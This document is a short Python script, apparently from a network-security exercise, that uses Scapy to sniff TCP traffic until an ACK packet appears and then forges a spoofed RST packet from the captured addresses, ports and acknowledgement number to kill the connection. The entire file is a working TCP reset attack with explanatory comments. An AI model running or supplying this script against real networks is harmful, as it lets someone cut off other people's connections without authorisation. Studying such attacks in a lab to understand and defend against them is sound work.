#! /usr/bin/env python
from scapy.all import *

# Identify the packet with the "ACK" flag
def stopfilter(x):
	if x[TCP].flags == 16:
		return True
	else:
		return False

# Sniff packets until we find the one with the "ACK" flag
packets = sniff(filter='tcp', stop_filter=stopfilter)

# Get the last packet we sniffed
packet = packets[-1]

# Get the relevant parameters from the packet and switch the
# source and destination so that the ack number we acquired is
# valid since it is only usable on a message that is a "reply"
# to the intercepted one
src = packet[IP].dst
dst = packet[IP].src
sport = packet[TCP].dport
dport = packet[TCP].sport
flags = "R"
seq = packet[TCP].ack

# Create the reset hijacking packet
# The IP layer the source and destionation IP
# The TCP layer has the source and destionation ports, the "RST" flag and the sequence number
# derived from the intercepted packet
hijack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags=flags, seq=seq)

# Bamboozle
send(hijack)




